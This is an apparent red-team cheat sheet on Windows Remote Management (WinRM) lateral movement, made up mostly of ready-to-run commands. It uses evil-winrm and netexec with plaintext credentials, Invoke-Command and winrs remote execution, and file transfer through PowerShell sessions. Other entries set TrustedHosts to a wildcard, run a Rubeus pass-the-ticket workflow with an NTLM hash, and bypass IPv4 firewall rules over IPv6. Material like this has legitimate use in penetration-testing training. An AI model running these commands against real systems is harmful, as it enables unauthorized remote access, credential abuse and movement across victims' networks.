# 05.11 WinRM PSRemoting

> Hit WinRM (5985/5986) with `evil-winrm -s` or `Invoke-Command` — Remote Management Users membership is enough; IPv6 can bypass IPv4 ACLs.

## Overview

WinRM (TCP 5985 HTTP / 5986 HTTPS) enables PowerShell remoting. Members of Remote Management Users (not just admins) can connect. From Windows: Invoke-Command, winrs, and New-PSSession+Copy-Item for file transfer. From Linux: netexec winrm and evil-winrm (supports `-s` for PS script loading). Rubeus PtT enables ticket-based auth; `Set-Item WSMan:\localhost\client\trustedhosts` fixes TrustedHosts errors. IPv6 addresses can bypass IPv4 firewall blocks.

## Steps

- Enumerate with `nmap -p5985,5986` and `netexec winrm` for (Pwn3d!).
- `Invoke-Command -ComputerName` for one-shot remote execution; use `-Credential` with IP addresses or `-Authentication Negotiate` for FQDN.
- `winrs -r:<host>` for simple command execution; `/username:/password:` for explicit creds.
- `New-PSSession` + `Copy-Item -ToSession / -FromSession` for bidirectional file transfer.
- `Enter-PSSession` for interactive shell; must use FQDN or `-Authentication Negotiate` to avoid Kerberos SPN errors.
- Fix TrustedHosts error: `Set-Item WSMan:\localhost\client\trustedhosts -value * -Force`.
- Rubeus PtT workflow: `asktgt /rc4 /nowrap` → `createnetonly` → `ptt /ticket:` → `Enter-PSSession ... -Authentication Negotiate`.
- evil-winrm `-s /path/` loads PS scripts; type filename inside shell to import; use `menu` to see loaded cmdlets.

## Commands

### nmap WinRM

```bash
nmap -p5985,5986 <TARGET> -sCV
```

### netexec winrm check

```bash
netexec winrm <TARGET> -u frewdy -p Kiosko093
```

### netexec winrm execute

```bash
netexec winrm <TARGET> -u frewdy -p Kiosko093 -x "ipconfig"
```

### evil-winrm connect

```bash
evil-winrm -i <TARGET> -u '<DOMAIN>.local\frewdy' -p Kiosko093
```

### evil-winrm with script dir

```bash
evil-winrm -i <TARGET> -u '<DOMAIN>.local\frewdy' -p Kiosko093 -s '/home/plaintext/'
```

### Invoke-Command one-shot

```powershell
Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami }
```

### Invoke-Command with credential

```powershell
Invoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }
```

### winrs simple

```powershell
winrs -r:srv02 "powershell -c whoami;hostname"
```

### winrs with explicit credentials

```powershell
winrs /remote:srv02 /username:helen /password:RedRiot88 "powershell -c whoami;hostname"
```

### New-PSSession

```powershell
$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential
```

### Copy-Item to remote

```powershell
Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\helen\Desktop\Sample.txt' -Destination 'C:\Users\helen\Desktop\Sample.txt' -Verbose
```

### Copy-Item from remote

```powershell
Copy-Item -FromSession $sessionSRV02 -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\Users\helen\Desktop\host.txt' -Verbose
```

### Enter-PSSession interactive

```powershell
Enter-PSSession $sessionSRV02
```

### Enter-PSSession FQDN Negotiate

```powershell
Enter-PSSession SRV02.<DOMAIN>.local -Authentication Negotiate
```

### Fix TrustedHosts

```powershell
Set-Item WSMan:localhost\client\trustedhosts -value * -Force
```

### Rubeus asktgt nowrap

```powershell
.\Rubeus.exe asktgt /user:leonvqz /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap
```

### Rubeus createnetonly

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
```

### Rubeus ptt ticket

```powershell
.\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP...
```

### Enter-PSSession IPv6

```powershell
Enter-PSSession -ComputerName [dead:beef::647f:620f:3a1a:e978] -Authentication Negotiate
```
